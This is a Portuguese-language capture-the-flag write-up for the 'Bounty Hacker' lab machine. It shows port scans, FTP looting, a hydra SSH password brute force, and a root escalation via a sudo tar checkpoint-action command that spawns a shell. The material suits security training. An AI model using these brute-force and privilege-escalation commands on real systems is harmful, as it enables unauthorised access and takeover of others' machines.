  # Bounty Hacker

* ### Scan de portas - Verificando quais portas estão abertas.
```Bash
rustscan -a 10.10.178.7
```
![image](https://github.com/lufffe/Writeups/assets/90646635/c75d4612-250b-4b74-9b23-02cf7c96fad4)

![image](https://github.com/lufffe/Writeups/assets/90646635/d28fe285-c25f-498d-b388-ff0e594dd34a)

* ### Verificando o que está rodando nas portas encontradas.
```Bash
nmap -A -p 21,22,80 10.10.178.7
```
![image](https://github.com/lufffe/Writeups/assets/90646635/709b59c3-3ead-480d-8d68-efb2b099e2a8)

* ### Verificando o que tem no FTP e baixando os arquivos que tem lá.
```Bash
ftp 10.10.178.7
```
![image](https://github.com/lufffe/Writeups/assets/90646635/7f86aa14-38e5-40b9-97af-7fb7894b5b4b)

* ### Os arquivos encontrados são uma wordlist e uma msg do lin.
![image](https://github.com/lufffe/Writeups/assets/90646635/9591eb26-ecab-4fc7-80a9-133e233981a3)

* ### Fazendo um bruteforce no serviço de SSH, para encontrar a senha do LIN, que possivelmente estará na wordlist.
```Bash
hydra -l lin -P locks.txt 10.10.178.7 ssh
```
![image](https://github.com/lufffe/Writeups/assets/90646635/707a3763-b100-40cd-87a0-df0e26be6b38)

* ### E assim que acessar encontrar a Flag User.
```Bash
cat user.txt
```

* ### Ponto para escalar previlégio.
```Bash
sudo -l
```
![image](https://github.com/lufffe/Writeups/assets/90646635/6c87b8c9-d117-43a5-934f-6451c2b5e2e9)

* ### GTFOBINS.
![image](https://github.com/lufffe/Writeups/assets/90646635/66d7ba4b-c84d-40a2-a212-27472a4d9e03)

* ### Conseguindo acesso Root.
```Bash
sudo /bin/tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
```
![image](https://github.com/lufffe/Writeups/assets/90646635/c6bf026c-cfae-4a02-8ee1-58dc436aa8f6)

* ### Pegando Flag Root.
```Bash
cat /root/root.txt
```
